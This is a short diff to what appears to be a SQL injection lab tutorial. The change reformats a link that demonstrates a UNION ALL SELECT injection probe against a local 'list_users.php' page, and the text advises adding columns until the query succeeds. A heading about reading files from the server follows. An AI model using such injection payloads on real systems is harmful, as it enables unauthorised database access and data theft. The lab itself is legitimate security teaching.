@@ -58,7 +58,7 @@ Error when calling this url:
 
 Check if you can do a [`UNION SELECT`](https://www.techonthenet.com/sql/union_all.php) (add numbers at the end of the line until the query works 1, then 1,2, then 1,2,3 and s forth...):
 
-[http://127.0.0.1:8781/load_file/list_users.php?UserID=1%20UNION%20ALL%20SELECT%201,2,3](http://127.0.0.1:8781/load_file/list_users.php?UserID=1 UNION ALL SELECT 1,2,3)
+[http://127.0.0.1:8781/load_file/list_users.php?UserID=1 UNION ALL SELECT 1,2,3](http://127.0.0.1:8781/load_file/list_users.php?UserID=1+UNION+ALL+SELECT+1,2,3)
 
 ## Read sensible files
 
